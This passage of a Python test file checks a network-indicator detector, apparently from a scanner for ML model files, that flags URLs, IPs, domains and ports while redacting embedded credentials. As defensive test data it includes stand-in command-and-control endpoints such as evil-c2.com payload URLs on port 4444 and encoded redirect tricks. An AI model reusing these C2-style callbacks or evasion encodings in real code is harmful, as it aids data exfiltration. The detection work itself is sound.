        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/meta-llama/{repo_id}/resolve/main/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/meta-llama/{repo_id}/resolve/main/model.safetensors"

    def test_huggingface_repository_home_ids_are_preserved(self) -> None:
        """Public Hugging Face repository home URLs should keep exact repo identity."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/meta-llama/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/meta-llama/{repo_id}"

    def test_single_segment_huggingface_model_ids_are_preserved(self) -> None:
        """Single-component public Hugging Face model URLs should stay useful."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/{repo_id}"

    def test_huggingface_api_repository_ids_are_preserved(self) -> None:
        """Hugging Face API paths should keep public repo IDs for audit follow-up."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/api/models/meta-llama/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/api/models/meta-llama/{repo_id}"

    @pytest.mark.parametrize("route", ["datasets", "spaces"])
    def test_huggingface_prefixed_repository_ids_are_preserved(self, route: str) -> None:
        """Prefixed Hugging Face repository routes should keep public repo IDs."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/{route}/meta-llama/{repo_id}/resolve/main/data.json".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/{route}/meta-llama/{repo_id}/resolve/main/data.json"

    def test_public_github_repository_names_are_preserved(self) -> None:
        """Public source repository identities should remain visible while refs can still be redacted."""
        detector = NetworkCommDetector()
        repo_id = "MyModel-2025-LongName-abcdef"
        url = f"https://raw.githubusercontent.com/org/{repo_id}/main/model.py"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_public_github_ref_names_are_preserved(self) -> None:
        """Public GitHub source refs should remain visible for audit follow-up."""
        detector = NetworkCommDetector()
        ref = "ReleaseCandidate2025-05-abcdef"
        url = f"https://raw.githubusercontent.com/org/repo/{ref}/model.py"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_public_github_release_repository_names_are_preserved(self) -> None:
        """Public GitHub release repository identities should remain visible for audit follow-up."""
        detector = NetworkCommDetector()
        repo_id = "MyModel-2025-LongName-abcdef"
        url = f"https://github.com/org/{repo_id}/releases/download/v1/model.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_non_public_hex_path_capability_tokens_are_redacted(self) -> None:
        """Opaque lowercase hex download IDs should be redacted outside public model revisions."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdef0123456789abcdef"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_two_class_high_entropy_path_tokens_are_redacted(self) -> None:
        """Base32/base36-style bearer tokens may only use lowercase letters and digits."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz"

        findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Domain-like path tokens should not leak through the later domain detector."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_backtick_wrapped_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Markdown code delimiters should not hide the URL around a dotted path token."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(f"`https://example.com/download/{path_token}/model.bin`".encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_parenthesized_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Parenthesized call URLs should still suppress redacted path-token domain hits."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(
            f"requests.get(https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_markdown_link_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Markdown-link parentheses should bound URL domain suppression."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(
            f"[model](https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_domain_suppression_url_lookup_is_bounded(self) -> None:
        """Domain suppression should not scan unbounded whitespace-free buffers."""
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"
        data = (
            b"https://example.com/"
            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
            + f"/{path_token}/model.bin".encode()
        )

        assert network_comm._url_text_containing_offset(data, data.index(path_token.encode())) is None

    def test_long_url_credentials_do_not_reappear_as_domain_findings(self) -> None:
        """Indexed URL spans should protect credentials beyond the bounded fallback window."""
        secret = "secret-value.example.com"
        data = (
            b"https://example.com/"
            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
            + f"/api_key/{secret}/model.bin".encode()
        )

        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    def test_long_url_credentials_do_not_reappear_as_ip_findings(self) -> None:
        """Long URL paths must not let a redacted IP-shaped credential become a second finding."""
        secret = "45.33.32.156"
        data = (
            b"https://example.com/"
            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
            + f"/api_key/{secret}/model.bin".encode()
        )

        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    def test_encoded_path_separator_tokens_are_redacted(self) -> None:
        """Encoded separators should not make a token and following artifact look benign."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"

        findings = detector.scan(f"https://example.com/download/{path_token}%2Fweights.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>%2Fweights.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", [":", "%3A"])
    def test_colon_delimited_path_tokens_are_redacted(self, separator: str) -> None:
        """Colon-delimited keyed capabilities should have the token component removed."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download/token{separator}{path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/token:<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_high_entropy_artifact_filename_stems_are_redacted(self) -> None:
        """Opaque bearer tokens carried as known artifact filenames should not bypass redaction."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
        """URL-safe base64 token stems may include hyphen and underscore before artifact suffixes."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_lowercase_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
        """Lowercase URL-safe token stems with separators should still be entropy-checked."""
        detector = NetworkCommDetector()
        path_token = "abcdefghjkmnpqrstvwxyz0123456789-_"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize(
        "url",
        [
            "https://storage.googleapis.com/model-bucket-1234567890abcdef/weights.bin",
            "https://account.blob.core.windows.net/model-container-1234567890abcdef/weights.bin",
        ],
    )
    def test_path_style_cloud_bucket_names_are_preserved(self, url: str) -> None:
        """Path-style cloud bucket/container names should remain actionable."""
        detector = NetworkCommDetector()

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert url in serialized
        assert "<redacted>" not in serialized

    def test_path_style_cloud_bucket_parameters_are_redacted(self) -> None:
        """Bucket identity should stay visible while bucket path-parameter tokens are redacted."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        url = f"https://storage.googleapis.com/model-bucket;token={path_token}/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert "model-bucket;token=<redacted>" in serialized
        assert path_token not in serialized

    @pytest.mark.parametrize(
        ("url", "expected_url"),
        [
            (
                "wasbs://container@account.blob.core.windows.net/AbCdEfGhIjKlMnOpQrStUvWxYz012345/weights.bin",
                "wasbs://container@account.blob.core.windows.net/<redacted>/weights.bin",
            ),
            (
                "abfss://container@account.dfs.core.windows.net/AbCdEfGhIjKlMnOpQrStUvWxYz012345/weights.bin",
                "abfss://container@account.dfs.core.windows.net/<redacted>/weights.bin",
            ),
        ],
    )
    def test_wasb_and_abfs_object_path_tokens_are_redacted(self, url: str, expected_url: str) -> None:
        """WASB/ABFS containers live in the authority, so the first path segment is still object data."""
        detector = NetworkCommDetector()

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == expected_url
        assert "AbCdEfGhIjKlMnOpQrStUvWxYz012345" not in json.dumps(cloud_finding, sort_keys=True)

    def test_encoded_wasb_userinfo_credentials_are_stripped(self) -> None:
        """Encoded credential userinfo must not be mistaken for an Azure container name."""
        detector = NetworkCommDetector()
        url = "wasbs://user%3ASECRET@account.blob.core.windows.net/model.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "wasbs://account.blob.core.windows.net/model.bin"
        assert "user%3ASECRET" not in json.dumps(cloud_finding, sort_keys=True)

    def test_wasb_container_shaped_userinfo_on_non_azure_host_is_stripped(self) -> None:
        """Azure schemes must not preserve userinfo on unrelated hosts."""
        url = "wasbs://accesskey@example.com/model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "wasbs://example.com/model.bin"
        assert "accesskey" not in redacted

    def test_gcs_api_bucket_names_are_preserved(self) -> None:
        """GCS JSON/download API bucket segments live after /b/ rather than at path index 1."""
        detector = NetworkCommDetector()
        url = "https://storage.googleapis.com/download/storage/v1/b/model-bucket-1234567890abcdef/o/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert "model-bucket-1234567890abcdef" in serialized
        assert "<redacted>" not in serialized

    def test_gcs_object_key_tokens_after_b_directory_are_redacted(self) -> None:
        """Only GCS API /b/{bucket}/ routes should preserve the segment after b."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        url = f"https://storage.googleapis.com/model-bucket/b/{path_token}/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "https://storage.googleapis.com/model-bucket/b/<redacted>/weights.bin"
        assert path_token not in json.dumps(cloud_finding, sort_keys=True)

    def test_long_artifact_filenames_are_preserved(self) -> None:
        """Ordinary model artifact filenames should not be treated as capability tokens."""
        detector = NetworkCommDetector()
        filename = "pytorch_model-00001-of-00002.bin"
        data = f"https://huggingface.co/org/repo/resolve/main/{filename}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert filename in url_finding["url"]

    def test_safetensors_artifact_filenames_are_preserved(self) -> None:
        """SafeTensors shard names should stay visible for audit and SBOM follow-up."""
        detector = NetworkCommDetector()
        filename = "pytorch_model-00001-of-00002.safetensors"
        data = f"https://huggingface.co/org/repo/resolve/main/{filename}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/org/repo/resolve/main/{filename}"

    @pytest.mark.parametrize("prefix", ["ghp", "gho", "ghu", "ghs", "ghr"])
    def test_github_path_tokens_are_redacted(self, prefix: str) -> None:
        """Known token formats embedded in URL paths should be removed."""
        detector = NetworkCommDetector()
        github_token = f"{prefix}_abcdefghijklmnopqrstuvwxyz0123456789"
        data = f"https://raw.githubusercontent.com/org/repo/{github_token}/model.py".encode()

        findings = detector.scan(data, "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://raw.githubusercontent.com/org/repo/<redacted>/model.py"
        assert github_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/token/bert-base/resolve/main/model.safetensors",
            "https://huggingface.co/org/auth/resolve/token/model.safetensors",
            "https://github.com/token/auth/blob/token/model.py",
            "https://raw.githubusercontent.com/token/auth/token/model.py",
            "https://storage.googleapis.com/token/model.bin",
        ],
    )
    def test_public_repository_and_bucket_identifiers_named_like_keys_are_preserved(self, url: str) -> None:
        """Public resource identifiers must not imply that the next path segment is a credential."""
        findings = NetworkCommDetector().scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_huggingface_path_tokens_override_repository_preservation(self) -> None:
        """Known tokens must be redacted even where public repository names are normally preserved."""
        token = "hf_" + "a" * 34
        url = f"https://huggingface.co/{token}/repo/resolve/main/model.bin"

        redacted = network_comm.redact_url_for_finding(url)

        assert redacted == "https://huggingface.co/<redacted>/repo/resolve/main/model.bin"
        assert token not in redacted

    def test_huggingface_path_token_near_miss_is_preserved(self) -> None:
        """Short hf_-prefixed repository names should remain actionable."""
        repository_owner = "hf_" + "a" * 29
        url = f"https://huggingface.co/{repository_owner}/repo/resolve/main/model.bin"

        assert network_comm.redact_url_for_finding(url) == url

    def test_benign_short_url_paths_are_preserved(self) -> None:
        """Ordinary URL paths should remain readable after redaction."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"https://example.com/models/v1/model.bin", "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/models/v1/model.bin"

    def test_detect_ipv4_addresses(self) -> None:
        """Test detection of IPv4 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        192.168.1.1
        10.0.0.1
        8.8.8.8
        172.16.0.1
        """

        findings = detector.scan(data)
        ipv4_findings = [f for f in findings if f["type"] == "ipv4_address"]

        assert len(ipv4_findings) == 4

        # Check private vs public classification
        private_ips = [f for f in ipv4_findings if f.get("is_private")]
        public_ips = [f for f in ipv4_findings if f.get("is_global")]

        assert len(private_ips) == 3  # 192.168, 10.0, 172.16
        assert len(public_ips) == 1  # 8.8.8.8

    def test_nearby_version_word_does_not_hide_ipv4(self) -> None:
        """Nearby prose should not hide an actual IP address."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"callback version 8.8.8.8 now")

        assert any(finding["type"] == "ipv4_address" and finding["ip"] == "8.8.8.8" for finding in findings)

    def test_explicit_version_literals_are_not_reported_as_ipv4(self) -> None:
        """Version-shaped metadata should not be reported as network endpoints."""
        detector = NetworkCommDetector()

        findings = detector.scan(
            b"version 1.2.3.4\nmodel version 2.3.4.5\nrelease 3.4.5.6\nver=4.5.6.7 build=5.6.7.8\n"
        )

        assert not [finding for finding in findings if finding["type"] == "ipv4_address"]

    def test_detect_ipv6_addresses(self) -> None:
        """Test detection of IPv6 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        2001:0db8:85a3:0000:0000:8a2e:0370:7334
        fe80:0000:0000:0000:0202:b3ff:fe1e:8329
        """

        findings = detector.scan(data)
        ipv6_findings = [f for f in findings if f["type"] == "ipv6_address"]

        assert len(ipv6_findings) == 2

    @pytest.mark.parametrize(
        "url, secret",
        [
            ("https://evil.example/api_key=12.34.56.78/model.bin", "12.34.56.78"),
            (
                "https://evil.example/api_key=2001:0db8:85a3:0000:0000:8a2e:0370:7334/model.bin",
                "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            ),
            ("https://12.34.56.78@example.com/model.bin", "12.34.56.78"),
            ("https://12.34.56.78'@example.com/model.bin", "12.34.56.78"),
        ],
    )
    def test_ip_findings_do_not_reexpose_redacted_url_credentials(self, url: str, secret: str) -> None:
        """IP-shaped URL credentials should disappear from every serialized finding."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)

    def test_url_host_ip_still_produces_an_ip_finding(self) -> None:
        """Skipping redacted URL credentials must not hide an actual endpoint IP."""
        findings = NetworkCommDetector().scan(b"https://12.34.56.78/model.bin", "hook.py")

        assert any(finding["type"] == "ipv4_address" and finding["ip"] == "12.34.56.78" for finding in findings)

    @pytest.mark.parametrize(
        ("url", "finding_type", "field", "value"),
        [
            (
                "https://benign.example/download?next=https://evil-c2.com/payload",
                "domain_name",
                "domain",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?next=https://45.33.32.156/payload",
                "ipv4_address",
                "ip",
                "45.33.32.156",
            ),
            (
                "https://benign.example/download#next=https://evil-c2.com/payload",
                "domain_name",
                "domain",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?api_key_hint=https://evil-c2.com/payload",
                "domain_name",
                "domain",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?next=evil-c2.com",
                "domain_name",
                "domain",
                "evil-c2.com",
            ),
        ],
    )
    def test_nested_url_endpoints_remain_independent_findings(
        self,
        url: str,
        finding_type: str,
        field: str,
        value: str,
    ) -> None:
        """Dropping outer URL query text must not hide an embedded endpoint."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding["type"] == finding_type and finding[field] == value for finding in findings)

    @pytest.mark.parametrize("component_separator", ["?", "#"])
    @pytest.mark.parametrize(
        ("nested_uri", "expected_findings"),
        [
            (
                "tcp://evil-c2.com:4444/payload",
                {("domain_name", "domain", "evil-c2.com"), ("suspicious_port", "port", 4444)},
            ),
            (
                "redis://45.33.32.156:6379/0",
                {("ipv4_address", "ip", "45.33.32.156"), ("suspicious_port", "port", 6379)},
            ),
        ],
    )
    def test_redirect_components_preserve_unsupported_uri_endpoints(
        self,
        component_separator: str,
        nested_uri: str,
        expected_findings: set[tuple[str, str, object]],
    ) -> None:
        """Ordinary redirect keys must not hide endpoints carried by other URI schemes."""
        url = f"https://benign.example/download{component_separator}next={nested_uri}"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert all(
            any(finding.get("type") == finding_type and finding.get(field) == value for finding in findings)
            for finding_type, field, value in expected_findings
        )

    @pytest.mark.parametrize(
        ("url", "nested_url"),
        [
            (
                "https://benign.example/download?next=https%3A%2F%2Fevil-c2.com%2Fpayload",
                "https://evil-c2.com/payload",
            ),
            (
                "https://benign.example/download#redirect=https%253A%252F%252Fevil-c2.com%252Fpayload",
                "https://evil-c2.com/payload",
            ),
            (
                "https://benign.example/download?callback=https%3A%2F%2F45.33.32.156%2Fpayload",
                "https://45.33.32.156/payload",
            ),
            (
                "https://benign.example/download?api_key_hint=https%3A%2F%2F45.33.32.156%2Fpayload",
                "https://45.33.32.156/payload",
            ),
        ],
    )
    def test_encoded_nested_url_endpoints_remain_findings(self, url: str, nested_url: str) -> None:
        """Encoded redirect targets must survive outer query and fragment redaction."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding["type"] == "url_detected" and finding["url"] == nested_url for finding in findings)

    @pytest.mark.parametrize(
        ("url", "nested_uri"),
        [
            (
                "https://benign.example/?next=tcp%3A%2F%2Fevil-c2.com%3A4444%2Fpayload",
                "tcp://evil-c2.com:4444/payload",
            ),
            (
                "https://benign.example/#redirect=redis%3A%2F%2F45.33.32.156%3A6379%2F0",
                "redis://45.33.32.156:6379/0",
            ),
        ],
    )
    def test_encoded_unsupported_uri_endpoints_remain_findings(self, url: str, nested_uri: str) -> None:
        """Percent encoding must not hide endpoints that use non-HTTP URI schemes."""
        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(finding.get("type") == "url_detected" and finding.get("url") == nested_uri for finding in findings)

    @pytest.mark.parametrize(
        ("url", "secret"),
        [
            (
                "https://benign.example/download?token=https://evil-c2.com:4444/payload",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?api_key=https%3A%2F%2F45.33.32.156%3A4444%2Fpayload",
                "45.33.32.156",
            ),
            (
                "https://benign.example/download#authorization=tcp%3A%2F%2Fevil-c2.com%3A4444%2Fpayload",
                "evil-c2.com",
            ),
        ],
    )
    def test_sensitive_query_url_values_emit_only_redacted_endpoint_marker(self, url: str, secret: str) -> None:
        """URL-shaped credentials remain visible as a signal without exposing their value."""
        findings = NetworkCommDetector({"max_findings": 1}).scan(url.encode(), "tokens.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret not in serialized
        assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)

    @pytest.mark.parametrize(
        ("url", "secret"),
        [
            (
                "https://benign.example/download?api_key:https%3A%2F%2Fevil-c2.com%2Fpayload",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?x=1%26token=https%3A%2F%2Fevil-c2.com%2Fpayload",
                "evil-c2.com",
            ),
            (
                "https://benign.example/download?api+key=https%3A%2F%2F45.33.32.156%2Fpayload",
                "45.33.32.156",
            ),
            (
                "https://evil.example/api_key?x=https%3A%2F%2Fevil-c2.com%2Fpayload",
                "evil-c2.com",
            ),
        ],
    )
    def test_nested_url_credentials_with_indirect_keys_emit_only_redacted_marker(
        self,
        url: str,
        secret: str,
    ) -> None:
        """Decoded separators and path/query splits must not expose URL-valued credentials."""
        findings = NetworkCommDetector({"max_findings": 1}).scan(url.encode(), "tokens.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert secret not in serialized
        assert any(finding.get("url") == network_comm._SENSITIVE_NESTED_URL for finding in findings)

    @pytest.mark.parametrize(
        "url",
        [
            "https://benign.example/download?algorithm:https%3A%2F%2Fevil-c2.com%2Fpayload",
            "https://benign.example/download?x=1%26api_key_hint=https%3A%2F%2Fevil-c2.com%2Fpayload",
            "https://benign.example/download?api+keyboard=https%3A%2F%2Fevil-c2.com%2Fpayload",
            "https://evil.example/algorithm?x=https%3A%2F%2Fevil-c2.com%2Fpayload",
        ],
    )
    def test_indirect_sensitive_key_near_matches_preserve_nested_endpoint(self, url: str) -> None:
        nested_url = "https://evil-c2.com/payload"

        findings = NetworkCommDetector({"max_findings": 1}).scan(url.encode(), "tokens.txt")

        assert findings[0].get("url") == nested_url

    def test_encoded_nested_endpoint_in_cloud_url_remains_finding(self) -> None:
        """Nested endpoints must be decoded before generic URL-scheme filtering."""
        url = "s3://model-bucket/model?next=https%3A%2F%2F45.33.32.156%2Fpayload"

        findings = NetworkCommDetector().scan(url.encode(), "hook.py")

        assert any(
            finding["type"] == "url_detected" and finding["url"] == "https://45.33.32.156/payload"
            for finding in findings
        )
        assert any(
            finding["type"] == "cloud_storage_url" and finding["url"] == "s3://model-bucket/model"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("data", "secret", "endpoint_type", "endpoint_field", "endpoint"),
        [
            (
                b'headers={"Authorization":"Bearer secret-value.example.com"} callback.example.com',
                "secret-value.example.com",
                "domain_name",
                "domain",
                "callback.example.com",
            ),
            (
                b'headers={"Proxy-Authorization":"Basic 45.33.32.156"} endpoint=12.34.56.78',
                "45.33.32.156",
                "ipv4_address",
                "ip",
                "12.34.56.78",
            ),
            (
                b'auth=("user", "secret-value.example.com")\ncallback.example.com',
                "secret-value.example.com",
                "domain_name",
                "domain",
                "callback.example.com",
            ),
            (
                b'api_key="secret-value.example.com" callback.example.com',
                "secret-value.example.com",
                "domain_name",
                "domain",
                "callback.example.com",
            ),
        ],
    )
    def test_endpoint_shaped_credentials_do_not_create_findings(
        self,
        data: bytes,
        secret: str,
        endpoint_type: str,
        endpoint_field: str,
        endpoint: str,
    ) -> None:
        """Credential assignments must not reappear through generic endpoint scanners."""
        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)
        assert any(
            finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings
        )

    @pytest.mark.parametrize(
        ("data", "endpoint_type", "endpoint_field", "endpoint"),
        [
            (b"token-endpoint=45.33.32.156", "ipv4_address", "ip", "45.33.32.156"),
            (b"token endpoint=evil-c2.com", "domain_name", "domain", "evil-c2.com"),
            (b"access-token-url=public.example.com", "domain_name", "domain", "public.example.com"),
        ],
    )
    def test_token_endpoint_labels_do_not_suppress_network_indicators(
        self,
        data: bytes,
        endpoint_type: str,
        endpoint_field: str,
        endpoint: str,
    ) -> None:
        findings = NetworkCommDetector().scan(data, "hook.py")

        assert any(
            finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings
        )

    def test_auth_scheme_prose_does_not_exhaust_evidence_redaction_budget(self) -> None:
        data = b"\n".join(f"basic networking endpoint=45.33.32.{index}".encode() for index in range(1, 40))
        detector = NetworkCommDetector()

        findings = detector.scan(data, "model-card.txt")

        assert any(finding.get("ip") == "45.33.32.39" for finding in findings)
        assert detector._evidence_redaction_classifications == 0

    def test_nested_endpoint_assignment_remains_credential_context(self) -> None:
        secret = "45.33.32.156"

        findings = NetworkCommDetector().scan(f"token=endpoint={secret}".encode(), "tokens.txt")

        assert secret not in json.dumps(findings, sort_keys=True)

    @pytest.mark.parametrize(
        ("data", "secret", "endpoint_type", "endpoint_field", "endpoint"),
        [
            (
                b"Bearer 45.33.32.156 callback=12.34.56.78",
                "45.33.32.156",
                "ipv4_address",
                "ip",
                "12.34.56.78",
            ),
            (
                b"Basic evil-c2.com callback.example.com",
                "evil-c2.com",
                "domain_name",
                "domain",
                "callback.example.com",
            ),
        ],
    )
    def test_bare_auth_scheme_values_do_not_create_findings(
        self,
        data: bytes,
        secret: str,
        endpoint_type: str,
        endpoint_field: str,
        endpoint: str,
    ) -> None:
        findings = NetworkCommDetector().scan(data, "hook.py")

        assert secret not in json.dumps(findings, sort_keys=True)
        assert any(
            finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings
        )

    def test_repeated_domain_is_reported_only_from_noncredential_context(self) -> None:
        """Redaction must classify the matched span rather than another copy of its value."""
        domain = "callback.example.com"
        data = f'api_key="{domain}"\n{domain}'.encode()

        findings = NetworkCommDetector().scan(data, "hook.py")
        domain_findings = [finding for finding in findings if finding.get("domain") == domain]

        assert len(domain_findings) == 1
        assert domain_findings[0]["position"] == data.rindex(domain.encode())

    @pytest.mark.parametrize(
        ("data", "secret"),
        [
            (b'requests.get("https://evil.example/api_key/" "secret-value.example.com")', "secret-value.example.com"),
            (b'requests.get("https://evil.example/api_key/" + "45.33.32.156")', "45.33.32.156"),
            (
                'requests.get("https://evil.example/api_key/\u00e9secret-value.example.com")'.encode(),
                "secret-value.example.com",
            ),
